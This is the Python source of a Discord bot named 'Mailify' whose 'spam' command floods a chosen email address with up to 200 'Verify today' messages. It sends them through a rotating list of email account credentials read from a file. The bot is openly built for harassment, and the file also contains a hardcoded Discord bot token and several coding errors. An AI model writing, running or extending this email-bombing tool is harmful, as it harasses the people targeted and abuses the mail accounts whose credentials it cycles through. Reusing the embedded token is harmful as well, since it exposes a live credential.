import requests
import discord
import random
from discord.ext import commands, tasks
from itertools import cycle
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time
import asyncio
import json
from bs4 import BeautifulSoup
client = commands.Bot(command_prefix='m.', case_insensitive=True)
client.remove_command('help')

limit = 30
current = 0
spams = 0
total = 0
status = cycle(['📫 | Spamming Emails', f'🏦 | Global Limit: {limit}'])
@client.event
async def on_ready():
    change_status.start()
    print("Mailify Online")
@tasks.loop(seconds=4)
async def change_status():
    await client.change_presence(activity=discord.Game(next(status)))



@client.command()
async def Spam(ctx,amount=None,*,email=None):
    global limit
    global current
    global spams
    if amount == None or email == None:
        await ctx.send("Please use with format [m.spam [amount] [email]")
    else:
        x = int(amount)
    if x > 200:
        await ctx.send("Listen here fucker pay France to send more")
        total += x
    else:
        spams += 1
        channel = client.get_channel(802985463035723827)
        checking = discord.Embed(title="📫 | Mailify [V1.0]", description="Flooding with the best API's", color=0x00ffee)
        checking.add_field(name="Current Flood:", value=f'📫 | {email}', inline=False)
        checking.add_field(name="Amount:", value=f'📨 | {x}', inline=False)
        checking.add_field(name="User:", value=f'🧑 | {ctx.author}', inline=False)
        checking.set_footer(text="Developed by Francegotsumheat#0938")
        await channel.send(embed=checking)
        embed = discord.Embed(title="📫 | Mailify [V1.0]", description="Flooding with the best API's", color=0x00ffee)
        embed.add_field(name="Current Flood:", value=f'📫 | {email}', inline=False)
        embed.add_field(name="Flood Status: ",value="Started")
        embed.set_footer(text=ctx.author, icon_url=ctx.author.avatar_url)
        await ctx.send(embed=embed, delete_after=3)
        mail_content = 'Verify today'
        for i in range(x):
            Random = (random.randint(0, 999))
            try:
                lines = open('emails.txt').read().splitlines()
                myline = random.choice(lines)
                USER = (myline.split(":")[0])
                PASS = (myline.split(":")[1])
                sender_address = f'{USER}'
                sender_pass = f'{PASS}'
                receiver_address = f'{email}'
                message = MIMEMultipart()
                message['From'] = sender_address
                message['To'] = receiver_address
                message['Subject'] = f'Verify Today: {Random}'   #The subject line
                message.attach(MIMEText(mail_content, 'plain'))
                session = smtplib.SMTP('smtpserver', 587) #Change SMTP server with yours
                session.starttls() #enable security
                session.login(sender_address, sender_pass) #login with mail_id and password
                text = message.as_string()
                session.sendmail(sender_address, receiver_address, text)
                session.quit()
            except smtplib.SMTPSenderRefused:
                print(f'Having problems with {USER} | {PASS}')
                continue
        complete = discord.Embed(title="📫 | Mailify [V1.0]", description="Flooding with the best API's", color=0x00ffee)
        complete.add_field(name="Current Flood:", value=f'📫 | {email}', inline=False)
        complete.add_field(name="Amount:", value=f'📨 | {x}', inline=False)
        complete.add_field(name="Account Used:", value=f'📥 | {USER}', inline=False)
        complete.add_field(name="Flood Status: ",value="Completed")
        complete.set_footer(text="Developed by Francegotsumheat#0938")
        await ctx.author.send(embed=complete)


@client.command(hidden=True)
async def stats(ctx):
    apiss = 14
    embed=discord.Embed(title="📫 | Mailify [V1.0]", description="Flooding with the best API's", color=0x00ffee)
    embed.add_field(name="Global Limit:", value=f'🌍 | {limit}', inline=False)
    embed.add_field(name="Total APIs:", value=f'⚡ | {apiss}', inline=False)
    embed.add_field(name="Total Sent:", value=f'📩 | {total}', inline=False)
    embed.add_field(name="Total Flooded:", value=f'📫 | {spams}', inline=False)
    embed.set_footer(text="Developed by Francegotsumheat#0938")
    await ctx.send(embed=embed, delete_after=15)

@client.command()
@command.is_owner()
async def addemail(ctx, email):
    with open("emails.txt", "a+") as f:
        f.write(f"\n{email}")
    embed = discord.Embed(title="Success")
    embed.description = "We have successfully added that email!"
    await ctx.send(embed=embed, delete_after=3)

client.run('ODAyNzI3ODEwODc0NDc0NTE4.YAzciA.-43nbbP9hA0mXL0Vu3FsitmJg2s')